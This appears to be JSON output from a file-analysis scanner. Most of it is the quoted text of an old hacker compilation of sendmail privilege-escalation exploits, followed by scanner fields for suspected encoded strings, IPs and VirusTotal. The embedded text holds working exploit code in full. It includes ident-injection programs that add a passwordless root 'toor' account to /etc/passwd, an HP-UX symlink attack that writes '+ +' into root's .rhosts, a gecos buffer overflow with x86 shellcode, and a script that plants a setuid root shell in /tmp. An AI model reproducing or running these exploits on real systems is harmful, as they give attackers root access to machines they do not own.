            "#include <sys/types.h>",
            "#include <unistd.h>",
            "#include <stdlib.h>",
            "main(argc, argv)",
            "int argc;",
            "char **argv;",
            "        execlp(argv[2] ? argv[2] : \"sendmail\",\"sendmail\",\"-odq\",\"-p\",",
            "        \"ascii\\nCroot\\nMprog, P=/bin/sh, F=lsDFMeu, A=sh -c $u\\nMlocal, ",
            "P=/bin/sh, F=lsDFMeu,",
            "A=sh -c $u\\nR<\\\"|/bin/cp /bin/sh /tmp/newsh\\\">\\nR<\\\"|/bin/chmod 6777 ",
            "/tmp/newsh\\\">\\n$rascii \",",
            "        argv[1] ? argv[1] : \"atreus\",0);",
            "................................ CuT HeRe ..................................",
            "= 8.6.10 ident/newlines =      *8.6.10*",
            "This is a sendmail 8.6.10 attack based on the problems that sendmail ",
            "8.6.10 inherited from sendmail 8.6.9 .... Look at comments in the source.",
            "Two exploits follow:",
            "/* 8.6.10 sendmail attacker",
            " * gcc ident.c -o ident",
            " * add the following line to your /etc/inetd.conf:",
            " * ident  stream tcp  nowait  root  /tmp/ident  in.identd",
            " * then kill -HUP inetd",
            " * Not for not public use or disclosure.",
            " * This is a sendmail 8.6.10 attack based on the problems that",
            " * sendmail 8.6.10 inherited from sendmail 8.6.9 - blindly accepting",
            " * information given to it by identd, which included bogus characters",
            " * and newlines that it later appended to the queue file.  Sendmail 8.6.10",
            " * supposedly \"strips\" newlines before they are written, however, it",
            " * converts them to spaces, and the following code demonstrates that",
            " * quick work-around patches are never ever stable...",
            " * NOTES:  This hack only works when sendmail queues up the message for",
            " * later delivery.  This depends on the configuration of sendmail.cf and",
            " * on the machine loading.  If you can do something to drag the machine to",
            " * its knees, then fire off this attack, you stand a much better chance of",
            " * success.",
            " * NOTES: If sendmail.cf is configured with Og1 and Ou1 lines (setting the",
            " * default user to bin.bin), this exploit will not work.",
            " * Also, since this only works when sendmail queues up the message for",
            " * later delivery, the time of execution is dependant on how sendmail",
            " * has been configured in sendmail.cf and machine load.  Heavily loaded",
            " * machines (or machines that have been intentionally flooded) have a",
            " * greater possibility of this exploit working.",
            "#include <sys/types.h>",
            "#include <sys/fcntl.h>",
            "#include <sys/time.h>",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <unistd.h>",
            "/* TIMEOUT is the number of seconds to wait before closing the connection if",
            " * the client doesn't provide the port pairs.",
            "#define TIMEOUT 120",
            "/* PROCINFO_BUFFER_SIZE must be bigger than 80 */",
            "#define OUTPUT_BUFFER_SIZE 2048",
            "#define SOCKET_BUFFER_SIZE 100",
            "unsigned short lport = 0, rport = 0;",
            "void",
            "main ()",
            "    unsigned long here, there;",
            "    struct fd_set fdset;",
            "    struct timeval timeout;",
            "    char buffer[OUTPUT_BUFFER_SIZE];",
            "    char inbuffer[SOCKET_BUFFER_SIZE];",
            "    int len;",
            "    int fd;",
            "    FD_ZERO (&fdset);",
            "    FD_SET (0, &fdset);",
            "    timeout.tv_sec = TIMEOUT;",
            "    timeout.tv_usec = 0;",
            "    select (1, &fdset, NULL, NULL, &timeout);",
            "    len = read (0, inbuffer , SOCKET_BUFFER_SIZE - 1 );",
            "    if (len <= 0)",
            "    exit (0);",
            "    FD_SET (0, &fdset);",
            "    sprintf (buffer, \"%s : USERID : UNIX : %s\\r\\n\", inbuffer,",
            "    \"Croot\\r\\nMprog, P=/bin/sh, F=lsDFMeu, A=sh -c $u\\r\\nMlocal,",
            "    P=/bin/sh, F=lsDFMeu, A=sh -c $u\\r\\nR<\\\"|/bin/echo toor::0:1:toor:/:/bin/csh",
            " >> /etc/passwd\\\">\\r\\nR<\\\"|/usr/bin/chmod 4755 /usr/bin/time\\\");",
            "    write (1, buffer, strlen (buffer));",
            "    exit (0);",
            "................................ CuT HeRe ..................................",
            "Second Exploit follows:",
            "/* 8.6.10 sendmail attacker",
            " * gcc ident.c -o ident",
            " * add the following line to your /etc/inetd.conf:",
            " * ident  stream tcp  nowait  root  /tmp/ident  in.identd",
            " * then kill -HUP inetd",
            " * Not for not public use or disclosure.",
            " * This is a sendmail 8.6.10 attack based on the problems that",
            " * sendmail 8.6.10 inherited from sendmail 8.6.9 - blindly accepting",
            " * information given to it by identd, which included bogus characters",
            " * and newlines that it later appended to the queue file.  Sendmail 8.6.10",
            " * supposedly \"strips\" newlines before they are written, however, it",
            " * converts them to spaces, and the following code demonstrates that",
            " * quick work-around patches are never ever stable...",
            " * NOTES: If sendmail.cf is configured with Og1 and Ou1 lines (setting the",
            " * default user to bin.bin), this exploit will not work.",
            " * Also, since this only works when sendmail queues up the message for",
            " * lar delivery, the time of execution is dependant on how sendmail",
            " * has been configured in sendmail.cf and machine load.  Heavily loaded",
            " * machines (or machines that have been intentionally flooded) have a",
            " * greater possibility of this exploit working.",
            "#include <sys/types.h>",
            "#include <sys/fcntl.h>",
            "#include <sys/time.h>",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <unistd.h>",
            "/* TIMEOUT is the number of seconds to wait before closing the connection if",
            " * the client doesn't provide the port pairs.",
            "#define TIMEOUT 120",
            "/* PROCINFO_BUFFER_SIZE must be bigger than 80 */",
            "#define OUTPUT_BUFFER_SIZE 2048",
            "#define SOCKET_BUFFER_SIZE 100",
            "unsigned short lport = 0, rport = 0;",
            "void",
            "main ()",
            "    unsigned long here, there;",
            "    struct fd_set fdset;",
            "    struct timeval timeout;",
            "    char buffer[OUTPUT_BUFFER_SIZE];",
            "    char inbuffer[SOCKET_BUFFER_SIZE];",
            "    int len;",
            "    int fd;",
            "    FD_ZERO (&fdset);",
            "    FD_SET (0, &fdset);",
            "    timeout.tv_sec = TIMEOUT;",
            "    timeout.tv_usec = 0;",
            "    select (1, &fdset, NULL, NULL, &timeout);",
            "    len = read (0, inbuffer , SOCKET_BUFFER_SIZE - 1 );",
            "    if (len <= 0)",
            "    exit (0);",
            "    FD_SET (0, &fdset);",
            "    sprintf (buffer, \"%s : USERID : UNIX : %s\\r\\n\", inbuffer,",
            "    \"Croot\\t\\t\\t\\t\\t\\t\\tMprog, P=/bin/sh, F=lsDFMeu, A=sh -c $u\\t\\t\\t\\t\\t\\t",
            "    Mlocal,",
            "    P=/bin/sh, F=lsDFMeu, A=sh -c $u\\t\\t\\t\\t\\t\\tR<\\\"|/bin/echo toor::0:1:toor:/:",
            "/bin/csh >> /etc/passwd\\\">\\t\\t\\tR<\\\"|/usr/bin/chmod 4755 /usr/bin/time\\\">\\r\\n",
            "    $rascii done\");",
            "    write (1, buffer, strlen (buffer));",
            "    exit (0);",
            "        ",
            "................................ CuT HeRe ..................................",
            "= HP-UX =                  *HP-UX 9.x*     ",
            "#!/bin/sh",
            "# This works on virgin HPUX 9.x sendmail.cf",
            "# The link can be set to any file on the system, it will append the contents",
            "# of the email to the linked file (/etc/passwd, /etc/hosts.equiv, /.rhosts)..",
            "# - sirsyko",
            "r00tDIR=`grep root /etc/passwd |cut -f6 -d:`",
            "RunDMC=`hostname`",
            "if [ -f /tmp/dead.letter ]; then rm /tmp/dead.letter",
            "if [ -f /tmp/dead.letter ]; then",
            " echo \"Sorry, aint gonna work\"",
            " exit",
            "ln -s  ${r00tDIR}/.rhosts /tmp/dead.letter",
            "sleep 1",
            "echo \"helo\"",
            "echo \"mail from: noone\"",
            "echo \"rcpt to: noone@bounce\"",
            "echo \"data\"",
            "echo \"+ +\"",
            "echo \".\"",
            "sleep 3",
            "echo \"quit\"",
            ") | telnet ${RunDMC} 25",
            "sleep 5",
            "remsh ${RunDMC} -l root",
            "............... CuT HeRe ...............",
            "What the r00t guys exploit does is just this: ",
            "- creates a symbolic link to the target file",
            "  (in this case '.rhosts' in root's directory) called '/tmp/dead.letter'.",
            "- Then sends a message (containing lines you want to append) to a ",
            "  non-existent user.",
            "- Sendmail is configured (as default) to append lines of non-recipient",
            "  messages to '/tmp/dead.letter' and does it with root privileges.",
            "  If '/tmp/dead.letter' is a symbolic link Sendmail will follow it",
            "  and will overwrite the pre-existent file.",
            "- Probably if Sendmail configuration has been changed to make it behave ",
            "  in a different way, looking at the cf file could lead you to exploit ",
            "  the bug the same. ",
            "= 8.7.5 gecos =                *8.X.X <8.8.0* *TeSTed oN 8.6.12*",
            "This bug was pointed out by Mudge of L0pht on Bugtraq on Sept 1996,",
            "excerpts follow:",
            "------ ",
            "A buffer overflow condition exists that allows a user to overwrite the ",
            "information in a saved stack frame. When the function returns, the saved ",
            "frame is popped off of the stack and user code can be executed.",
            "If a user is able to alter his/her gecos field then that user can",
            "exploit a coding flaw in sendmail to elevate their effective UID to 0.",
            "The actual problem in the code is quite apparent.",
            "  Inside recipient.c we find the following:",
            "  char nbuf[MAXNAME + 1];",
            "  ...",
            "  buildfname(pw->pw_gecos, pw->pw_name, nbuf);",
            "The problem is that nbuf[MAXNAME + 1] is a fixed length buffer and as",
            "we will soon see, buildfname() does not honor this.",
            "[ ..... ]",
            "This particular problem has been fixed in Sendmail 8.8 beta.",
            "_______",
            "Here we have an example of exploit:",
            "------------------------------ Cut Here ------------------------------------",
            "/*                               Hi !                                       */",
            "/* This is exploit for sendmail bug (version 8.6.12 for FreeBSD 2.1.0).     */",
            "/* If you have any problems with it, send letter to me.                     */",
            "/*                             Have fun !                                   */",
            "/* -----------------   Dedicated to my beautiful lady   ------------------  */",
            "/* Leshka Zakharoff, 1996. E-mail: leshka@chci.chuvashia.su                 */",
            "#include <stdio.h>",
            "main()",
            "void make_files();",
            "     make_files();",
            "     system(\"EDITOR=./hack;export EDITOR;chmod +x hack;chfn;/usr/sbin/sendmail;e",
            "cho See result in /tmp\");",
            "void make_files()",
            "  int i,j;",
            "  FILE *f;",
            "  char nop_string[200];",
            "  char code_string[]=",
            "                      {",
            "                         \"\\xeb\\x50\"                         /* jmp    ",
            "cont */",
            "/* geteip: */            \"\\x5d\"                             /* popl   ",
            "%ebp */",
            "                         \"\\x55\"                             /* pushl  ",
            "%ebp */",
            "                         \"\\xff\\x8d\\xc3\\xff\\xff\\xff\"         /* decl   ",
            "0xffffffc3(%ebp) */",
            "                         \"\\xff\\x8d\\xd7\\xff\\xff\\xff\"         /* decl   ",
            "0xffffffd7(%ebp) */",
            "                         \"\\xc3\"                             /* ret */",
            "/* 0xffffffb4(%ebp): */ \"cp /bin/sh /tmp\"",
            "/* 0xffffffc3(%ebp): */ \"\\x3c\"",
            "                        \"chmod a=rsx /tmp/sh\"",
            "/* 0xffffffd7(%ebp): */ \"\\x01\"",
            "                        \"-leshka-leshka-leshka-leshka-\"    /* reserved */",
            "/* cont:  */            \"\\xc7\\xc4\\x70\\xcf\\xbf\\xef\"         /* movl   ",
            "$0xefbfcf70,%esp */",
            "                        \"\\xe8\\xa5\\xff\\xff\\xff\"             /* call   ",
            "geteip */",
            "                        \"\\x81\\xc5\\xb4\\xff\\xff\\xff\"         /* addl   ",
            "$0xb4ffffff,%ebp */",
            "                        \"\\x55\"                             /* pushl  %ebp */",
            "                        \"\\x55\"                             /* pushl  %ebp */",
            "                        \"\\x68\\xd0\\x77\\x04\\x08\"             /* pushl  ",
            "$0x80477d0",
            "                        \"\\xc3\"                             /* ret */",
            "                        \"-leshka-leshka-leshka-leshka-\"    /* reserved */",
            "                        \"\\xa0\\xcf\\xbf\\xef\"",
            "                     };",
            "  j=269-sizeof(code_string);",
            "  for(i=0;i<j;nop_string[i++]='\\x90');",
            "  nop_string[j]='\\0';",
            "  f=fopen(\"user.inf\",\"w\");",
            "  fprintf(f,\"#Changing user database information for leshka\\n\");",
            "  fprintf(f,\"Shell: /usr/local/bin/bash\\n\");",
            "  fprintf(f,\"Location: \\n\");",
            "  fprintf(f,\"Office Phone: \\n\");",
            "  fprintf(f,\"Home Phone: \\n\");",
            "  fprintf(f,\"Full Name: %s%s\\n\",nop_string,code_string);",
            "  fclose(f);",
            "  f=fopen(\"hack\",\"w\");",
            "  fprintf(f,\"cat user.inf>\\\"$1\\\"\\n\");",
            "  fprintf(f,\"touch -t 2510711313 \\\"$1\\\"\\n\");",
            "  fclose(f);",
            "................................ Cut Here ................................",
            "= mime7to8() =                 *8.8.0*",
            "An attacker can simply create a very large message in which each line ",
            "ends with \"=\" and use it to overwrite the sendmail process's stack.",
            "Here the bug is only described... why doesn't someone write an exploit?!",
            "------",
            "There is a serious bug in the mime7to8() function of sendmail 8.8.0",
            "which allows anyone who can send you mail to execute arbitrary code as",
            "root on your machine.  I think mime7to8() only gets invoked if you set",
            "the undocumented \"9\" mailer flag.  However, this flag is set by",
            "default in the cf/mailer/local.m4 file that ships with sendmail",
            "8.8.0.  Thus, if you are using an old V6 format configuration file",
            "from sendmail 8.7, you are probably safe, but if you generated a new",
            "V7 configuration file, you are probably vulnerable to this bug.",
            "Now here are the technical details:",
            "The inner loop of mime7to8() looks like this:",
            "        u_char *obp;",
            "        char buf[MAXLINE];",
            "        u_char obuf[MAXLINE];",
            "        ....",
            "                /* quoted-printable */",
            "                obp = obuf;",
            "                while (fgets(buf, sizeof buf, e->e_dfp) != NULL)",
            "                {",
            "                        if (mime_fromqp((u_char *) buf, &obp, 0, MAXLINE) == 0)",
            "                                continue;",
            "                        putline((char *) obuf, mci);",
            "                        obp = obuf;",
            "                }",
            "When mime_fromqp() encounters a line that ends \"=\\n\", it chops those",
            "two characters off and returns 0 to indicate a continuation line.",
            "This causes the while loop to continue, reading another input line and",
            "appending its contents to obuf.  However, when the loop continues",
            "without resetting obp to obuf, there are fewer than MAXLINE characters",
            "left in the output buffer.  This means an attacker can simply create a",
            "very large message in which each line ends with \"=\".  Eventually obp",
            "will move beyond the end of obuf and start writing almost arbitrary",
            "data to the sendmail process's stack (as long as no bytes are 0).",
            "--------",
            "= smtpd =                      *8.7-8.8.2*",
            "Read the exploit and don't bother:",
            "------------------------------ Cut Here --------------------------------",
            "#/bin/sh",
            "#                                   Hi !",
            "#                This is exploit for sendmail smtpd bug",
            "#    (ver. 8.7-8.8.2 for FreeBSD, Linux and may be other platforms).",
            "#         This shell script does a root shell in /tmp directory.",
            "#          If you have any problems with it, drop me a letter.",
            "#                                Have fun !",
            "#                           ----------------------",
            "#               ---------------------------------------------",
            "#    -----------------   Dedicated to my beautiful lady   ------------------",
            "#               ---------------------------------------------",
            "#                           ----------------------",
            "#          Leshka Zakharoff, 1996. E-mail: leshka@leshka.chuvashia.su",
            "echo   'main()                                                '>>leshka.c",
            "echo   '{                                                     '>>leshka.c",
            "echo   '  execl(\"/usr/sbin/sendmail\",\"/tmp/smtpd\",0);         '>>leshka.c",
            "echo   '}                                                     '>>leshka.c",
            "echo   'main()                                                '>>smtpd.c",
            "echo   '{                                                     '>>smtpd.c",
            "echo   '  setuid(0); setgid(0);                               '>>smtpd.c",
            "echo   '  system(\"cp /bin/sh /tmp;chmod a=rsx /tmp/sh\");      '>>smtpd.c",
            "echo   '}                                                     '>>smtpd.c",
            "cc -o leshka leshka.c;cc -o /tmp/smtpd smtpd.c",
            "./leshka",
            "kill -HUP `ps -ax|grep /tmp/smtpd|grep -v grep|tr -d ' '|tr -cs \"[:digit:]\" \"\\n\"",
            "|head -n 1`",
            "rm leshka.c leshka smtpd.c /tmp/smtpd",
            "/tmp/sh",
            ".............................. Cut Here ...................................",
            "...............................oO THe eND Oo...............................",
            "============= Credits ===============",
            "All this info was mainly grabbed from: ",
            "- Bugtraq",
            "- 8lgm",
            "- In***ax Digest",
            "- \"Improving the Security of Your Site by Breaking Into it\"",
            "    By Dan Farmer & Wietse Venema",
            "- \"Sendmail Bug Exploits List v.04b\" ",
            "    By Per1com/Xer0",
            "- \"Time For a Change\" #1 'UNIX problems, for fun and exploit.' ",
            "    By Ghost in the Machine  "
        ],
        "file": {},
        "fuzzing": {
            "Possible encoded string": [
                "                         \"\\xff\\x8d\\xc3\\xff\\xff\\xff\"         /* decl   ",
                "                         \"\\xff\\x8d\\xd7\\xff\\xff\\xff\"         /* decl   ",
                "/* cont:  */            \"\\xc7\\xc4\\x70\\xcf\\xbf\\xef\"         /* movl   ",
                "                        \"\\xe8\\xa5\\xff\\xff\\xff\"             /* call   ",
                "                        \"\\x81\\xc5\\xb4\\xff\\xff\\xff\"         /* addl   ",
                "                        \"\\xa0\\xcf\\xbf\\xef\""
            ]
        },
        "ip": [
            "128.128.128.1",
            "127.127.127.127",
            "198.7.0.2"
        ],
        "url": []
    },
    "time": "0:00:00.693873",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
